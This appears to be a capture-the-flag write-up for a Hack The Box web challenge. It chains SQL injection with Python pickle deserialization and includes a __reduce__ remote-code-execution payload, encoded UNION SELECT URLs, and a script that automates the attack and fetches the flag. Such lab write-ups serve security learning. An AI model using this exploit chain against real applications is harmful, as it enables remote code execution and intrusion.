# C.O.P.: HTB Challenge

### Pickle

As the Title of the challenge says we're talking about Pickle Deserialization.
Pickle is a python library that serialize and deserialize data...in unsecure way.

It this challenge it takes data from the db, serialize it in base64 and give it back deserialized to the html webpage.

### SQL

Inside the "product" page we can see the products that are called via URL with the id: /views/1

```python
    @staticmethod
    def select_by_id(product_id):
        return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)
```

### Exploit

- https://davidhamann.de/2020/04/05/exploiting-python-pickle/
- https://exploit-notes.hdks.org/exploit/web/framework/python/python-pickle-rce/

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
# Copy the flag to the static folder which we have access to.
        cmd = ('cp flag.txt application/static/.')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickle.dumps(RCE())).decode('ascii'))
```

Run the script to obtain the base64 string, the pickles will take care of it, then copy the ouptut and paste it in the url with the SQL Injection.

```
/view/' UNION SELECT 'gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg==

/view/'%20UNION%20SELECT%20'gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg==
```

Navigate to http://../static/flag.txt to see the content of the flag

## Python Script
```python
import requests
import sys

if len(sys.argv) != 2:
    print("Usage: python3 script.py <URL>")
    sys.exit(1)

# Payload.
payload = "'%20UNION%20SELECT%20'gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg=="

clean_url = sys.argv[1]
payload_url = clean_url + "/view/" + payload
url_flag = clean_url + "/static/flag.txt"

if not clean_url.startswith('http://') and not clean_url.startswith('https://'):
    clean_url = 'http://' + clean_url
    
# Send the request
try:
    response = requests.get(payload_url)

    if response.status_code == 200:
    	print("######################################################")
    	print("Flag Copied to " + str(url_flag))
    	print("######################################################")
    else:
        print(f'Errore {response.status_code}: GET request failed.')
except requests.exceptions.RequestException as e:
    print(f'Errore nella richiesta: {e}')

def flag():
    try:
        response_flag = requests.get(url_flag)

        if response_flag.status_code == 200:
            data = response_flag.content
            decoded_data = data.decode('utf-8')
            print(" ")
            print("THE FLAG IS:")
            print("############")
            print(" ")
            print(decoded_data)
        else:
            print(f'Errore {response_flag.status_code}: GET request for the flag failed.')
    except requests.exceptions.RequestException as e:
        print(f'Errore nella richiesta del flag: {e}')

flag()
```
